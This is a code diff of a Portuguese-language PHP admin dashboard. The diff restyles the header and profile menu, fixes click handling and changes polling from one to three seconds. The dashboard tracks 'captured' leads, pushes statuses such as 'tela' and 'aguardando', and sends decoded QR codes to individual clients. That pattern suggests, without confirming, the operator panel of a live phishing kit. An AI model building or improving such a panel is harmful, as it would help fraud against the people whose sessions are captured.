@@ -33,6 +33,7 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
             --accent-success: #50cd89;
             --accent-danger: #f1416c;
             --border-color: #323248;
+            --color-yellow: #ffc700;
         }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--bg-dark); color: var(--text-primary); font-size: 14px; }
 
@@ -52,6 +53,7 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
         .main-panel {
             display: flex;
             flex-direction: column;
+            overflow-y: auto;
         }
         .panel-header {
             display: flex;
@@ -59,7 +61,8 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
             align-items: center;
             padding: 0 32px;
             height: 70px;
-            background-color: var(--bg-dark);
+            background-color: var(--bg-card);
+            border-bottom: 1px solid var(--border-color);
             position: sticky; top: 0;
             z-index: 10;
         }
@@ -74,10 +77,12 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
         }
         .sidebar-menu button.btn:hover { background-color: rgba(0, 158, 247, 0.1); color: var(--accent-primary); }
         
-        .panel-header .quote { font-style: italic; color: var(--text-secondary); }
+        .panel-header .quote { display: flex; align-items: center; gap: 10px; font-style: italic; color: var(--text-secondary); }
+        .quote i { color: var(--color-yellow); }
+        .profile-button { background: none; border: none; cursor: pointer; padding: 8px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--text-secondary); }
+        .profile-button:hover { color: var(--text-primary); background-color: var(--bg-sidebar); }
+        
         .profile-dropdown-container { position: relative; }
-        .profile-button { background: none; border: none; cursor: pointer; padding: 0; border-radius: 50%; }
-        .profile-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: var(--accent-primary); display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 16px; }
         .profile-dropdown {
             display: none; position: absolute; top: 55px; right: 0; background-color: var(--bg-card); border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); list-style: none; padding: 8px 0; margin: 0; width: 200px; z-index: 100; border: 1px solid var(--border-color);
         }
@@ -119,10 +124,13 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
 
         <div class="main-panel">
             <header class="panel-header">
-                <div class="quote">"Acredite em você e todo o resto virá naturalmente."</div>
+                <div class="quote">
+                    <i data-feather="zap" style="width:18px; height:18px;"></i>
+                    <span>"Acredite em você e todo o resto virá naturalmente."</span>
+                </div>
                 <div class="profile-dropdown-container">
                     <button class="profile-button" id="profile-btn">
-                        <div class="profile-avatar">A</div>
+                        <i data-feather="user"></i>
                     </button>
                     <ul class="profile-dropdown" id="profile-menu">
                         <li><a href="#"><i data-feather="user"></i> Perfil</a></li>
@@ -166,9 +174,12 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
         // LÓGICA DO MENU DROPDOWN
         const profileBtn = document.getElementById('profile-btn');
         const profileMenu = document.getElementById('profile-menu');
-        profileBtn.addEventListener('click', () => { profileMenu.classList.toggle('show'); });
+        profileBtn.addEventListener('click', (event) => {
+            event.stopPropagation();
+            profileMenu.classList.toggle('show');
+        });
         window.addEventListener('click', (event) => {
-            if (profileBtn && !profileBtn.contains(event.target) && profileMenu && !profileMenu.contains(event.target)) {
+            if (profileMenu.classList.contains('show') && !profileBtn.contains(event.target)) {
                 profileMenu.classList.remove('show');
             }
         });
@@ -182,17 +193,15 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
 
         // FUNÇÃO PARA COLAR E PROCESSAR O QR CODE
         function handlePaste(event, el) {
-            const card = el.closest('.card');
+            const card = el.closest('.lead-card');
             const lead_id = card.dataset.id;
             const items = (event.clipboardData || window.clipboardData).items;
-
             for (const item of items) {
                 if (item.type.indexOf("image") === 0) {
                     event.preventDefault();
                     const blob = item.getAsFile();
                     const img = new Image();
                     img.src = URL.createObjectURL(blob);
-                    
                     img.onload = () => {
                         const canvas = document.createElement("canvas");
                         canvas.width = img.width;
@@ -201,31 +210,25 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                         ctx.drawImage(img, 0, 0);
                         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                         const code = jsQR(imageData.data, canvas.width, canvas.height);
-
                         if (code && code.data) {
                             el.innerHTML = 'Detectado! Enviando...';
                             const formData = new FormData();
                             formData.append("lead_id", lead_id);
-                            formData.append("qrcode_text", code.data); // Enviando o texto do QR
-                            
-                            fetch("api_save_qr_text.php", {
-                                method: "POST",
-                                body: formData
-                            })
-                            .then(res => res.json())
-                            .then(result => {
-                                if(result.success) {
-                                    el.innerHTML = `✅ QR Code Salvo!`;
-                                    updateStatus(el, 'qr_enviado');
-                                } else {
-                                    alert("Erro: " + result.error);
-                                    el.innerHTML = 'Falha. Tente novamente.';
-                                }
-                            })
-                            .catch(() => {
-                                alert("Erro fatal ao enviar texto do QR.");
-                                el.innerHTML = 'Falha na conexão.';
-                            });
+                            formData.append("qrcode_text", code.data);
+                            fetch("api_save_qr_text.php", { method: "POST", body: formData })
+                                .then(res => res.json())
+                                .then(result => {
+                                    if(result.success) {
+                                        el.innerHTML = `✅ QR Code Salvo!`;
+                                        updateStatus(el, 'qr_enviado');
+                                    } else {
+                                        alert("Erro: " + result.error);
+                                        el.innerHTML = 'Falha. Tente novamente.';
+                                    }
+                                }).catch(() => {
+                                    alert("Erro fatal ao enviar texto do QR.");
+                                    el.innerHTML = 'Falha na conexão.';
+                                });
                         } else {
                             alert("Nenhum QR Code detectado na imagem colada.");
                             el.innerHTML = 'Cole a imagem aqui';
@@ -242,15 +245,13 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                 const response = await fetch('api_get_capturas.php');
                 if (!response.ok) throw new Error('Network response was not ok');
                 const leads = await response.json();
-
-                let existingIds = new Set(Array.from(leadsContainer.querySelectorAll('.lead-card')).map(c => c.dataset.id));
+                
                 let receivedIds = new Set(leads.map(l => l.id.toString()));
-
+                
                 // Remove cards que não existem mais nos dados
-                existingIds.forEach(id => {
-                    if (!receivedIds.has(id)) {
-                        const cardToRemove = document.getElementById(`lead-${id}`);
-                        if(cardToRemove) cardToRemove.remove();
+                Array.from(leadsContainer.querySelectorAll('.lead-card')).forEach(card => {
+                    if (!receivedIds.has(card.dataset.id)) {
+                        card.remove();
                     }
                 });
 
@@ -273,7 +274,6 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                         leadsContainer.prepend(card);
                     }
 
-                    // Atualiza os campos
                     card.querySelector('.lead-id').textContent = lead.id;
                     card.querySelector('.lead-date').textContent = new Date(lead.data_criacao).toLocaleString('pt-BR');
                     card.querySelector('.lead-identifier').textContent = lead.identificador;
@@ -283,19 +283,18 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                     const statusText = lead.status || 'indefinido';
                     statusSpan.textContent = statusText;
 
-                    // Lógica de cores para o status
                     statusSpan.style.color = 'var(--text-primary)'; 
-                    if (statusText.toLowerCase().includes('aprovado') || statusText.toLowerCase().includes('enviado')) {
+                    const lowerStatus = statusText.toLowerCase();
+                    if (lowerStatus.includes('aprovado') || lowerStatus.includes('enviado')) {
                         statusSpan.style.color = 'var(--accent-success)';
-                    } else if (statusText.toLowerCase().includes('negado')) {
+                    } else if (lowerStatus.includes('negado')) {
                         statusSpan.style.color = 'var(--accent-danger)';
-                    } else if (statusText.toLowerCase().includes('aguardando')) {
+                    } else if (lowerStatus.includes('aguardando') || lowerStatus.includes('tela')) {
                         statusSpan.style.color = 'var(--accent-primary)';
                     }
                 });
                 
                 feather.replace();
-
             } catch (error) {
                 console.error("Erro ao buscar dados:", error);
             }
@@ -303,9 +302,8 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
 
         // FUNÇÃO PARA ATUALIZAR O STATUS (COMANDO DO ADMIN)
         async function updateStatus(button, newStatus) {
-            const card = button.closest('.card');
+            const card = button.closest('.lead-card');
             const leadId = card.dataset.id;
-            
             try {
                 const response = await fetch('api_status_manager.php', {
                     method: 'POST',
@@ -313,11 +311,9 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                     body: JSON.stringify({ id: leadId, status: newStatus })
                 });
                 const result = await response.json();
-
                 if (result.success) {
-                    // Não precisa de alert, a atualização visual já é o feedback
                     console.log(`Status do Lead #${leadId} alterado para "${newStatus}".`);
-                    fetchData(); // Atualiza os dados imediatamente para refletir a mudança
+                    fetchData();
                 } else {
                     alert("Erro ao atualizar status: " + (result.error || 'Erro desconhecido'));
                 }
@@ -328,9 +324,8 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
         
         // FUNÇÃO PARA EXCLUIR UM LEAD
         async function deleteLead(button) {
-            const card = button.closest('.card');
+            const card = button.closest('.lead-card');
             const leadId = card.dataset.id;
-
             if (confirm(`Tem certeza que deseja excluir o Cliente #${leadId}?`)) {
                 try {
                     const response = await fetch('api_delete_lead.php', {
@@ -339,7 +334,6 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
                         body: JSON.stringify({ id: leadId })
                     });
                     const result = await response.json();
-
                     if (result.success) {
                         card.style.transition = 'opacity 0.5s ease';
                         card.style.opacity = '0';
@@ -379,7 +373,7 @@ if (isset($_GET['action']) && $_GET['action'] == 'logout') {
 
         // INICIA A BUSCA E O INTERVALO
         fetchData();
-        setInterval(fetchData, 1000); // Intervalo de 3 segundos
+        setInterval(fetchData, 3000);
     </script>
 </body>
 </html>
